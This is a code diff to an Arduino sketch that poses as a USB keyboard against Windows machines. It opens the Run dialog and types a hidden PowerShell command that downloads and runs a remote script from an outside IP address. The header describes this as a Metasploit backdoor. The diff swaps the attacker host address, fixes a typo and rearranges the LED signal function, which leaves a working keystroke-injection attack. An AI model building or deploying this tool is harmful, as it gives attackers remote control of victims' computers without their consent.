@@ -5,7 +5,7 @@
     TARGET-OS: Windows XP, Windows 7, Windows 8.x, Windows 10
     DEPENDENCIES: 
     DESCRIPTION:
-      will execute an arbitrary cmd command, in this case a metesploit backdoor command
+      will execute an arbitrary cmd command, in this case a metasploit backdoor command
 
 
 */
@@ -103,11 +103,17 @@ void keyString(String text) {
 }
 
 /////////////////////////////////////////////
+void finished()
+{
+
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+}
 
 void setup()
 {
    pinMode(ledPin, OUTPUT);
-   digitalWrite(ledPin, HIGH);
+   digitalWrite(ledPin, LOW);
    Serial.begin(9600);
 
    // Open Run dialog
@@ -123,7 +129,8 @@ void setup()
    delay(2000);
 
 /*
-   This giant mess enters the command "powershell.exe -nop -w hidden -c $v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.190.2.175:8080/');"
+   This giant mess enters the command "powershell.exe -nop -w hidden -c $v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://131.150.104.225:8080/');"
+
    */
 
    // Run powershell command
@@ -169,7 +176,7 @@ void setup()
    keyRelease();
    keyPress(0x02, KEY_SEMICOLON);
    keyRelease();
-   keyString("//10.190.2.175");
+   keyString("//131.150.104.225");
    keyRelease();
    keyPress(0x02, KEY_SEMICOLON);
    keyRelease();
@@ -185,13 +192,7 @@ void setup()
  }
 
 
-void finished()
-{
-  pinMode(ledPin, OUTPUT);
-  digitalWrite(ledPin, HIGH);
-  delay(500);
-  digitalWrite(ledPin, LOW);
-}
+
 void loop(){
   
 }
